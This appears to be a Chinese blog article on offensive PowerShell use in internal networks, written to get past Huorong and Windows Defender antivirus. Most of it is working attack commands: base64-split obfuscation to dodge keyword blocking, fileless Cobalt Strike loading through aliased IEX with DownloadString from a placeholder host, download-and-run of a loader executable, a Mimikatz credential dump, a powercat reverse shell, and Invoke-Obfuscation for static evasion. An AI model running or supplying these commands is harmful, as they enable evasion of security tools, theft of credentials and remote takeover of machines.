> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jQJdYRahrCe3nWCKEuqjgw)

powershell 是一个很好的宝藏库，在内网中可能会给出意外惊喜。

挑一点重点说说, 本文的杀软以火绒为主。

其实我们都用过 powershell，

比如 ls，dir

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NqzPMA6KC3bxA3o55S9LRLEYoZ2lh7wA8dBvaiagvb4Qm05VfMnwDibKQ/640?wx_fmt=png)

不过它只是 Get-ChildItem 别称。

常用命令和参数介绍：

命名规范: 动词 + 名词 = cmdlets

**-Get-ExecutionPolicy**: 查看当前执行策

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NvyBcfd6GVWtw7SKTw8yJxs9j2cibtNwOJRdzCWrZfPiapVMKbsbySMww/640?wx_fmt=png)

第一次我们运行 ps1 脚本的时候会遇到这种情况，因为 powershell 默认安全策略为 Restricted, 此时脚本不能执行

修改的使用

```
PS C:\Users\Admin> Set-ExecutionPolicy -Scope CurrentUser


位于命令管道位置 1 的 cmdlet Set-ExecutionPolicy
请为以下参数提供值:
ExecutionPolicy: Unrestricted
执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): Y
```

Unrestricted: 允许所有脚本运行 (**需要管理员权限**)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NGmg6GKyIXclSGFIibRkNr5rZmYegDOicTiapbXrFM8fVvKNb1tvW6JxRQ/640?wx_fmt=png)

因为 C:\Users\Admin 不在 powershell 默认环境中，所以我们需要输入绝对路径

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NEpU0zqawwiaLmd2rENFsWTlPmZyYKRBULfuHvCqlzhicS37ASVxkXU8w/640?wx_fmt=png)

```
$env:Path=$env:Path+"C:\Users\Admin"
```

添加到 powershell 的默认路径后，便可以直接执行了。

**&**：在字符串前加上 &，可以把字符串当成命令执行在字符串前加上 &，可以把字符串当成命令执行。  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39N1ic4icnpo04mP5DicsZ9STFHV1jeaXBUbjibMNQa9Wbvt8KnH19tF0H9Ng/640?wx_fmt=png)

相同的命令还有 **IEX(Invoke-Expression)**, 也是将字符串当作 powershell 执行

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NgibR4icY6JkR6ydAsRecfWy6kic5bIKkTUTTeEicXa9mlP7amr1wia2sItg/640?wx_fmt=png)

**-EXecutionPolicy Bypass**: 绕过 powershell 默认安全规定不能运行命令和文件

**-WindowStyle Hidden(-W Hidden)**: 隐藏窗口

**-Nonlnteractive(-Nonl)**: 非交互模式

**-noexit:** 执行但不退出 shell

**Get-FileHash:** 获取文件 hash

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NWWJpRJJufEOJaLFm7zLMWWdqz58N8c7XacKyPpQricia2XuExfoTlEWA/640?wx_fmt=png)

**-Import-Module：**将模块添加到当前会话。  

```
//如上传操作
Import-Module BitsTransfer
Start-BitsTransfer -Source c:\test.txt -Destination http://x.x.x.x/test.txt -transfertype upload
```

**-EncodedCommand(-enc):** 接受 base64 编码的字符串

**-set-alias:** 设置别名

powershell 定义函数方式:

```
function FuncName(args[])
{
code;
}
```

  

  

编辑器：

win10 自带的 ISE 就挺不错，自动补全功能也很好。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NSOHAQSauLiakgSAD32P3Jm7ZB3icvNx398M2TuGcadDgm2ic6GfiaicV5Qg/640?wx_fmt=png)

powershell-cs 上线：

**![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39N29YOCzm5jiatNjL2LzmEM99wdOyxCrWvyOdbeQRGyrKbObcdNvRCkWg/640?wx_fmt=png)**

也是调用了 virtualalloc 那些 windows api 创建而成。  

常用的 API 还是要记住的

在一些木马分析的时候有时候也会感到有些相似的地方，比如，call ds:DeleteFileA..........call ds:CreateFileA............call ds:WriteFile.............call ds:CreateThread

删原来文件，创建一个新 word，写，加载到新线程中。因为套路相似，调用的 API 也相似。

推荐查询网址：

https://docs.microsoft.com/zh-cn/windows/win32/apiindex/windows-api-list?redirectedfrom=MSDN

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NCUGtRPU7m4MVKibGFRBGAUfvMFTDwxdrmL5DYoK05m0agyo4nv5ISZg/640?wx_fmt=png)

首次扫描，火绒被火绒杀了。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39Nqs5kJR7MgIKT6D0PoRgichLRpJtULSD3ibKl5BrMKiaVODO1bszKVpjzw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NZZyOr3pu7qMCyRc0d7ZtKLmbuNokQvojEOm0CylzjuwdubZlrQstbQ/640?wx_fmt=png)

在我们对这段代码加入上面我们的混淆以后，火绒便不会杀了，cs 也可以正常上线。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NGEjyHYwKqSZUCEQo9lJoYPzNN0gFZrKEciaMs5NxicwafXTe9bkfhTIA/640?wx_fmt=png)

```
#然后火绒会对这个powershell执行脚本的行为进行行为拦截
#echo ......  | powershell 也会被拦截
powershell #从cmd进入powershell界面
function ConvertFrom-Base64($string) {$bytes  = [Sys;tem.Convert]::FromBase64String($string);$decoded = [System.Text.Encoding]::UTF8.GetString($bytes); return $decoded;}
$a="cG93ZXJzaGVsbCAtZXAgYnlwYXNzIC1mIE"
$b="M6XFVzZXJzXEFkbWluXERlc2t0b3BccGF5bG9hZC5wczE="
IEX(ConvertFrom-Base64($a+$b))
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NicNO1lgU8U6RxjAIXIoqicCaibPSgdwMxtbapwPYdpg4MWaM4pQahyib1Q/640?wx_fmt=png)

不会这样拦截类似 powershell -ep bypass -f ........ps1 了。

这个是笨方法

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NdNHUzTdfEibCby1JZmG42CNnk45p7fTnp8cEQL9icaJEicroDFGEuQGRw/640?wx_fmt=png)

因为测试其他 powershell 脚本的时候，没有被拦截，觉得还是关键字拦截。然后就这样混淆一下。

powershell-cs 无文件上线：

  

```
powershell set-alias -name test -value Invoke-Expression;test(New-Object Net.WebClient).DownloadString('http://x.x.x.x/payload.ps1')
```

**![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39Nmic8vaj9ePEx6dLxPBCIhN9SwXyBIn7oXBM8dxIYA8mO9pPeWnEAudA/640?wx_fmt=png)**

把修改后的 ps 脚本放在服务器上，在有火绒的虚拟机上好像是直接上线了。

windows defender 二话不说拦截，因为连 windows defender 静态免杀都没过。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NPQJhF3PbdCk0KlT7seXTxrlGpZTRGHKiaU2ylfol05nS8SyWrFRal3Q/640?wx_fmt=png)

至于怎么过 windows defender，上篇文章也写过。

不过这时候, 文件是落地的。

```
powershell -Command $clnt = new-object System.Net.WebClient;$url= 'http://X.X.X.X/Loader.exe';$file = ' D:\SYSTEM1.exe ';$clnt.DownloadFile($url,$file);&&D:\SYSTEM1.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NJjibBvUz45R7xSSjjZSkH2V5fv9SS2YlRb0zRibiaw94BicjL4I1WNmPEQ/640?wx_fmt=png)

  

**项目推荐:**

```
git clone https://github.com/mattifestation/PowerSploit.git

git clone https://github.com/samratashok/nishang
git clone https://github.com/besimorhino/powercat
```

**无文件落地端口扫描:**

**![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39N3IZe1HYCtzmv8xa9Q5JiatTKZyIjvkmp2fedk6fRYzaZc0Qnw5D7iapA/640?wx_fmt=png)**

脚本放到 vps，开启通道

在我们第一次尝试的时候，可能会出现这种问题：  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NZbRXs8VvpquglOK8I8T6N38ecMug0AluR0fl4ky2ApWaZjs3uHpfuw/640?wx_fmt=png)

解决办法:

第一种可能: 模块名字, 你不经意的打错了

第二种可能: 需要修改作用域的权限。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39Nj3m3b8s5ruOWB4IRXJoj83rD8j91MT7E9wiaxJvyzia9RlqeaylV0KLw/640?wx_fmt=png)

执行后为:

```
powershell -nop -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/Invoke-Portscan.ps1')";Invoke-Portscan -Hosts 192.168.37.0/24 -T 4 -ports "3389" -oA c:\windows\temp\est1.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NkHYw2cLAVt22B20jCjsnUXCy32HPf2aw6AKPb3LkW1Flkvrz4zltSg/640?wx_fmt=png)  

还有一点是执行的时候，杀软会拦截。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39N8GrLVV1ZzibdNRBXr3HeO3hKw88GicwYTibfz2ujbumflNj3secGuCVuw/640?wx_fmt=png)

不过我们换一种思路

```
powershell set-alias -name test -value Invoke-Expression;test(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.37.0/24 -T 4 -ports "3389" -oA c:\windows\temp\est3.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39N52cOicP8YqeXsfW3HkOItclbrQ9rgACYcLc2ojRWYNn8NhtyJunG6icg/640?wx_fmt=png)

给 IEX 设置一个别名，再执行，火绒便不会再拦截。

**无文件落地抓取密码:**

```
powershell IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
```

**反弹 shell:**

```
#被控端：
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://x.x.x.x/powercat.ps1');powercat -c x.x.x.x -p 6666 -e cmd

nc -lvp 8888
```

**power shell 免杀项目推荐:**

两个师傅的博客网址：

> https://www.chabug.org/?s=powershell
> 
> https://www.cnblogs.com/forforever/p/13882312.html

感觉这两位师傅写的总结的都挺不错的, 其他师傅写的也都很不错。

> https://github.com/danielbohannon/Invoke-Obfuscation

```
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39N0NficRyH8Mo0CPLDCsKbwt0eTdWklibmpBTbeL6Kh1U6iadDHEtLia4y3Q/640?wx_fmt=png)

进入我们的主界面

```
encoding模块进行混淆
launcher模块生成加载器
string模块混淆字符串
```

```
set scriptpath C:\Users\Admin\Desktop\payload222.ps1 #设置我们需要免杀的脚本路径
encoding
out 1.ps1
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NMibm3f3LSUyNUcnn4Ee58VPLjS1aiaicnWfflYgW83EQ0s9tjEsh599WA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39N5z7wnEyeu4Stf36zyptyXu2ibHo98VNdFCb4Fd2GZSpQ7HAhaFytWrQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09LBFaOWbbu3e7SJnt8s39NlTtIQV54vv9vue3ISiaIAXibWnO1JZa82vDZBayuhDyQBxvB55iad1zyg/640?wx_fmt=png)

这里是过了 Windows defender 的静态免杀，这个工具其他模块功能都挺足的，师傅们可以研究一下

其他项目：

> https://github.com/the-xentropy/xencrypt/blob/master/xencrypt.ps1
> 
> https://github.com/CBHue/PyFuscation
> 
> https://github.com/peewpw/Invoke-PSImage

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZ7rRw3kbvpDFicsKcLcp9Q7tYiaMwLANvcHAoByTiaGaus4HBukgfIXt9g/640?wx_fmt=png)